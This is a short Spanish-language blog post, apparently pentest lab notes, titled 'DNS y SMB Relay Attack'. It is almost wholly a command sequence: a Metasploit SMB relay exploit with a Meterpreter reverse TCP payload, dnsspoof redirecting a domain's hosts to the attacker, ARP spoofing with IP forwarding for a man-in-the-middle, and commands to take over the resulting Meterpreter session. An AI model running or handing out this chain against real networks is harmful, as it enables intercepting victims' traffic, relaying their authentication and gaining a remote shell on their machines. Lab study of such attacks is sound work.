---
title: 'DNS y SMB Relay Attack'
description: ''
pubDate: 'May 12 2023'
heroImage: '/'
slug: 'dns_smb_relay_attack'
---

```bash
msfconsole
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
exploit

```

ahora para rederigir a la victima a nuestro sistema Metasploit cada vez que haga una conexión a cualquier host en el dominio usamos **dnsspoof**

```bash
echo "172.16.5.101 *.sportsbass.com" > dns

# luego corremos nuestro dns

dnsspoof -i eth1 -f dns

```

luego activamos **MITM**

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

#
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5

```

conseguir una sesion meterpreter

```bash
sessions
sessions -i 1
getuid
```
